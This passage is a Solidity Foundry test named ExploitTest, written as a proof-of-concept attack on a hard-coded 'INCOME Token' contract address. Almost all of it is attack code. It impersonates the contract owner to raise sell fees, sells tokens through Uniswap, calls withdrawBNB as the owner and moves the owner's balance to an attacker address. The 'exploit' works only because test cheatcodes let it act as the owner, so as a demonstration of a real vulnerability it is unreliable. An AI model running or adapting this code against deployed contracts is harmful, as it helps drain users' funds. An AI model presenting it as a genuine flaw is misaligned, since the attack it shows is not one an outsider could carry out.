    function withdrawBNB(uint256 _amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x3a91A88Ef4bB813BB99EF5a745bcb56e3A3b403b;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the owner address from the contract
        address owner = INCOME(TARGET).owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "INCOME Token");
        vm.label(INCOME(TARGET).uniswapV2Pair(), "Uniswap Pair");

        // Impersonate owner for the entire setup
        vm.startPrank(owner);

        // Ensure trading is open (optional but helpful)
        INCOME(TARGET).openTrade();

        // Set extra fee on sell to 50 (high value)
        INCOME(TARGET).setExtraFeeOnSell(50);

        // Transfer some INCOME tokens to attacker for selling
        uint256 tokensToSell = 1000 * 10**18; // 1000 tokens
        INCOME(TARGET).transfer(attacker, tokensToSell);

        vm.stopPrank();

        // Give attacker some BNB for gas and initial liquidity
        vm.deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial BNB balance of attacker
        uint256 initialBalance = attacker.balance;

        // Get the INCOME token interface
        IERC20 incomeToken = IERC20(TARGET);

        // Get the router and pair addresses from the contract
        INCOME incomeContract = INCOME(TARGET);
        address routerAddress = address(incomeContract.uniswapV2Router());

        // Approve router to spend attacker's INCOME tokens
        uint256 attackerTokenBalance = incomeToken.balanceOf(attacker);
        incomeToken.approve(routerAddress, attackerTokenBalance);

        // Create path for swap: INCOME -> WETH
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = incomeContract.uniswapV2Router().WETH();

        // Perform the swap (sell INCOME for ETH)
        // This will trigger the high fee mechanism
        IUniswapV2Router02 router = IUniswapV2Router02(routerAddress);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            attackerTokenBalance,
            0, // accept any amount of ETH
            path,
            attacker,
            block.timestamp
        );

        // Now as owner, withdraw accumulated BNB from the contract
        address owner = incomeContract.owner();
        vm.prank(owner);
        incomeContract.withdrawBNB(address(incomeContract).balance);

        // Transfer withdrawn BNB to attacker (owner sends to attacker)
        vm.prank(owner);
        payable(attacker).transfer(address(owner).balance);

        // Verify attacker's BNB balance increased
        uint256 finalBalance = attacker.balance;
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

